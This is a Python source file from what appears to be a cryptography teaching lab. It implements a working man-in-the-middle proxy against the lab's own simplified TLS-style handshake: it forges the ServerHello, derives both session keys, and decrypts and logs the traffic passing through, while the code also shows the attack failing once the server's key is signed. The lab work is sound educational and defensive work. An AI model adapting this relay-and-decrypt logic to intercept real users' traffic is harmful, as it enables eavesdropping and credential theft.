"""
mitm.py
=================
A man-in-the-middle (MITM) attacker against the simplified handshake.

PURPOSE: this is the *attack* that proves why an UNAUTHENTICATED key exchange
is dangerous. The attacker sits between the client and the real server, runs a
separate Diffie-Hellman exchange with each side, and therefore holds BOTH
session keys. Every "encrypted" application record is decrypted, logged in the
clear, and re-encrypted before being forwarded -- the victims see a perfectly
normal, working session and never notice.

Ethical note: this code only ever runs against the project's own local lab
server on 127.0.0.1. It exists to demonstrate and then defend against the flaw.

    client  <-->  [ MITM proxy ]  <-->  real server
             leg A                leg B

Author: Mhyiar Elmistere
"""

from __future__ import annotations

import socket

from tls_common import (
    CIPHER_SUITE,
    PROTOCOL_VERSION,
    DHKeyPair,
    Logger,
    RecordCrypter,
    Transcript,
    derive_session_keys,
    finished_mac,
    new_random,
    recv_message,
    send_message,
    to_hex,
)


def run_mitm(listen_host: str, listen_port: int, server_host: str,
             server_port: int, ready=None) -> None:
    """Accept one victim client, connect to the real server, relay everything."""
    log = Logger("MITM")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy:
        proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy.bind((listen_host, listen_port))
        proxy.listen(1)
        print(f"[MITM] listening on {listen_host}:{listen_port}, "
              f"upstream={server_host}:{server_port}\n", flush=True)
        if ready is not None:
            ready.set()
        client_conn, _ = proxy.accept()
        with client_conn, socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_conn:
            server_conn.connect((server_host, server_port))
            _relay(client_conn, server_conn, log)


def _relay(client_conn: socket.socket, server_conn: socket.socket, log: Logger) -> None:
    # ---- Leg A transcript (attacker plays the SERVER to the client) -----
    ta = Transcript()
    # ---- Leg B transcript (attacker plays the CLIENT to the server) -----
    tb = Transcript()

    # 1) Victim's ClientHello arrives.
    client_hello, raw = recv_message(client_conn)
    ta.add(raw)
    client_random = bytes.fromhex(client_hello["client_random"])
    log.log("Intercepted ClientHello from victim")

    # 2) Open our own ClientHello to the real server (leg B).
    attacker_client_random = new_random()
    raw = send_message(
        server_conn,
        {
            "type": "client_hello",
            "version": PROTOCOL_VERSION,
            "client_random": attacker_client_random.hex(),
            "cipher_suites": [CIPHER_SUITE],
        },
    )
    tb.add(raw)

    # 3) Read the real ServerHello (leg B) and complete DH with the server.
    real_server_hello, raw = recv_message(server_conn)
    tb.add(raw)
    server_dh_public = int.from_bytes(bytes.fromhex(real_server_hello["dh_public"]), "big")
    attacker_client_dh = DHKeyPair.generate()
    attacker_server_random = new_random()

    # 4) Forge a ServerHello to the victim (leg A) using OUR OWN DH key.
    #    In insecure mode there is nothing to sign, so the victim accepts it.
    #    In secure mode we try to reuse the server's key material, but our
    #    substituted DH public breaks the signature -> the victim aborts.
    forged_hello = {
        "type": "server_hello",
        "version": PROTOCOL_VERSION,
        "server_random": attacker_server_random.hex(),
        "cipher_suite": CIPHER_SUITE,
        "dh_public": attacker_client_dh.public.to_bytes(256, "big").hex(),
        "authenticated": real_server_hello.get("authenticated", False),
    }
    if "server_pubkey" in real_server_hello:
        # Best effort: copy the server's identity + signature. This will NOT
        # verify because we changed the DH public key. Demonstrates the fix.
        forged_hello["server_pubkey"] = real_server_hello["server_pubkey"]
        forged_hello["dh_signature"] = real_server_hello["dh_signature"]
        log.note("secure target: forwarding stale signature (will fail on victim)")

    raw = send_message(client_conn, forged_hello)
    ta.add(raw)
    log.log("Sent FORGED ServerHello to victim (attacker DH key)")

    # 5) Victim's ClientKeyExchange (leg A) -> attacker computes leg-A keys.
    try:
        client_kx, raw = recv_message(client_conn)
    except ConnectionError:
        log.log("Victim closed the connection -> attack DEFEATED (server was authenticated)")
        return
    if client_kx.get("type") != "client_key_exchange":
        log.log("Victim aborted before key exchange -> attack DEFEATED")
        return
    ta.add(raw)
    victim_dh_public = int.from_bytes(bytes.fromhex(client_kx["dh_public"]), "big")

    # Leg-A keys: the attacker acts as the server to the victim, using the very
    # DH key it advertised in the forged ServerHello (attacker_client_dh).
    secret_a = attacker_client_dh.shared_secret(victim_dh_public)
    keys_a = derive_session_keys(secret_a, client_random, attacker_server_random)
    log.log("Derived leg-A session keys (attacker <-> victim)")
    log.note(f"leg-A shared secret = {to_hex(secret_a)}")

    # 6) Send our ClientKeyExchange to the real server (leg B).
    raw = send_message(
        server_conn,
        {"type": "client_key_exchange",
         "dh_public": attacker_client_dh.public.to_bytes(256, "big").hex()},
    )
    tb.add(raw)
    secret_b = attacker_client_dh.shared_secret(server_dh_public)
    keys_b = derive_session_keys(secret_b, attacker_client_random, attacker_server_random_from(real_server_hello))
    log.log("Derived leg-B session keys (attacker <-> real server)")

    # 7) Finished exchange on both legs.
    victim_finished, raw = recv_message(client_conn)  # leg A
    ta.add(raw)
    send_message(client_conn, {  # our server-Finished to victim
        "type": "finished",
        "mac": finished_mac(keys_a.master_secret, ta.digest(), b"server finished").hex(),
    })

    send_message(server_conn, {  # our client-Finished to server (leg B)
        "type": "finished",
        "mac": finished_mac(keys_b.master_secret, tb.digest(), b"client finished").hex(),
    })
    recv_message(server_conn)  # server Finished (leg B)
    log.log("Completed BOTH handshakes -> attacker now holds two session keys")

    # 8) Relay + decrypt application data.
    victim_reader = RecordCrypter(keys_a.client_write_key)   # decrypt victim
    victim_writer = RecordCrypter(keys_a.server_write_key)   # re-encrypt to victim
    server_writer = RecordCrypter(keys_b.client_write_key)   # re-encrypt to server
    server_reader = RecordCrypter(keys_b.server_write_key)   # decrypt server

    enc_from_victim, _ = recv_message(client_conn)
    plaintext = victim_reader.decrypt(bytes.fromhex(enc_from_victim["record"]))
    log.log("!!! DECRYPTED victim -> server traffic in the clear:")
    log.note(f'    stolen plaintext = {plaintext.decode()!r}')
    send_message(server_conn, {
        "type": "app_data",
        "record": server_writer.encrypt(plaintext).hex(),
    })

    enc_from_server, _ = recv_message(server_conn)
    reply = server_reader.decrypt(bytes.fromhex(enc_from_server["record"]))
    log.log("!!! DECRYPTED server -> victim traffic in the clear:")
    log.note(f'    stolen plaintext = {reply.decode()!r}')
    send_message(client_conn, {
        "type": "app_data",
        "record": victim_writer.encrypt(reply).hex(),
    })
    log.log("Relay complete -- victims saw a normal session, attacker read everything")


def attacker_server_random_from(real_server_hello: dict) -> bytes:
    """Leg-B server_random is chosen by the real server; use it for HKDF."""
    return bytes.fromhex(real_server_hello["server_random"])


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="MITM attacker for the TLS-style lab")
    parser.add_argument("--listen-port", type=int, default=8444)
    parser.add_argument("--server-host", default="127.0.0.1")
    parser.add_argument("--server-port", type=int, default=8443)
    parser.add_argument("--listen-host", default="127.0.0.1")
    args = parser.parse_args()
    run_mitm(args.listen_host, args.listen_port, args.server_host, args.server_port)


if __name__ == "__main__":
    main()
